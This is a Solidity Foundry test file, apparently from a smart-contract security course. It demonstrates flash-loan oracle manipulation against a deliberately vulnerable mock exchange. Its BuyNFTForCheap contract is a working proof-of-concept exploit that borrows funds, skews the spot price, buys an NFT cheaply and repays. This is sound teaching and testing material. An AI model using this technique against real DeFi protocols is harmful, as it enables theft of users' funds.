// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {OracleManipulation} from "../../src/oracle-manipulation/OracleManipulation.sol";
import {BadExchange} from "../../src/oracle-manipulation/BadExchange.sol";
import {FlashLoaner} from "../../src/oracle-manipulation/FlashLoaner.sol";
import {IFlashLoanReceiver} from "../../src/oracle-manipulation/IFlashLoanReceiver.sol";
import {MockUSDC} from "../mocks/MockUSDC.sol";
import {MockWETH} from "../mocks/MockWETH.sol";
import {ERC721Holder} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

contract OracleManipulationTest is Test {
    OracleManipulation public oracleManipulation;
    BadExchange public badExchange;
    FlashLoaner public flashLoaner;

    MockUSDC public mockUSDC;
    MockWETH public mockWETH;

    uint256 startingUsdc = 100e27;
    uint256 startingWeth = 1e27;

    uint256 flashLoanerStartingToken = 50e27;

    address user = makeAddr("user");
    address liquidityProvider = makeAddr("liquidityProvider");

    function setUp() public {
        mockUSDC = new MockUSDC();
        mockWETH = new MockWETH();
        vm.deal(address(mockWETH), 100e18);

        badExchange = new BadExchange(address(mockUSDC), address(mockWETH), "LiquidToken", "LT");
        oracleManipulation = new OracleManipulation(address(badExchange));
        flashLoaner = new FlashLoaner(address(mockUSDC));
        mockUSDC.mint(address(flashLoaner), flashLoanerStartingToken);

        // Setup the "true" price of ETH. 1 WETH = 100 USDC
        // Meaning, to buy the NFT, someone would have to pay 100 USDC worth of WETH
        vm.startPrank(liquidityProvider);
        mockUSDC.mint(liquidityProvider, startingUsdc);
        mockUSDC.approve(address(badExchange), startingUsdc);
        mockWETH.mint(liquidityProvider, startingWeth);
        mockWETH.approve(address(badExchange), startingWeth);
        badExchange.deposit(startingWeth, startingUsdc);
        vm.stopPrank();
    }

    function testStartingPrice() public {
        // The price is going to be just about 1 ETH == $100 (sliiiiiiightly less)
        uint256 expectedPrice = 1e18;
        uint256 delta = 1e16; // give or take a penny
        assertApproxEqAbs(oracleManipulation.getEthPriceOfNft(), expectedPrice, delta);
    }

    function testNormallyItCosts1ETHToBuyNft() public {
        // 1e17 is too low, it should revert, it should cost ~1e18
        uint256 amount = 1e17;

        vm.deal(user, amount);
        vm.prank(user);
        vm.expectRevert();
        oracleManipulation.buyNft{value: amount}();
    }

    function testFlashLoanBreaksIt() public {
        BuyNFTForCheap buyNFTForCheap = new BuyNFTForCheap(
            address(oracleManipulation), address(flashLoaner), address(badExchange), address(mockWETH), address(mockUSDC)
        );
        // instead of paying 1e18 of ETH, we are only going to pay about half that!
        // 1e18 == $100
        // We are going to start with only $50 of USDC
        mockUSDC.mint(address(buyNFTForCheap), 50e18);
        buyNFTForCheap.doFlashLoan();

        // Check we bought the NFT
        assertEq(oracleManipulation.balanceOf(address(buyNFTForCheap)), 1);
    }
}

contract BuyNFTForCheap is IFlashLoanReceiver, ERC721Holder {
    OracleManipulation oracleManipulation;
    FlashLoaner flashLoaner;
    BadExchange badExchange;
    MockWETH weth;
    MockUSDC usdc;
    uint256 flashLoanerStartingToken = 50e27;

    constructor(address _oracleManipulation, address _flashLoaner, address _badExchange, address _weth, address _usdc) {
        oracleManipulation = OracleManipulation(_oracleManipulation);
        flashLoaner = FlashLoaner(_flashLoaner);
        badExchange = BadExchange(_badExchange);
        weth = MockWETH(_weth);
        usdc = MockUSDC(_usdc);
    }

    // 1. take out flash loan
    // 2. dump the ETH on the bad exchange, tanking the price
    // 3. buy NFT for cheap
    // 4. repay

    // 1. Take out flash loan
    function doFlashLoan() public {
        flashLoaner.flashLoan(flashLoanerStartingToken);
    }

    function execute() public payable {
        console2.log("Price of the NFT starts at:", oracleManipulation.getEthPriceOfNft());
        // Swap USDC -> WETH on the exchange, tanking the price
        usdc.approve(address(badExchange), flashLoanerStartingToken);
        // Sell WETH on the exchange, tanking the price
        badExchange.swapExactInput(usdc, flashLoanerStartingToken, weth);
        // Buy NFT for cheap
        uint256 nftPrice = oracleManipulation.getEthPriceOfNft();
        console2.log("Price of the NFT is now:", nftPrice);
        weth.approve(address(weth), nftPrice);

        weth.withdraw(nftPrice);

        oracleManipulation.buyNft{value: nftPrice}();
        // Swap back
        weth.approve(address(badExchange), weth.balanceOf(address(this)));
        badExchange.swapExactInput(weth, weth.balanceOf(address(this)), usdc);
        usdc.transfer(address(flashLoaner), flashLoanerStartingToken);
    }

    receive() external payable {}
}
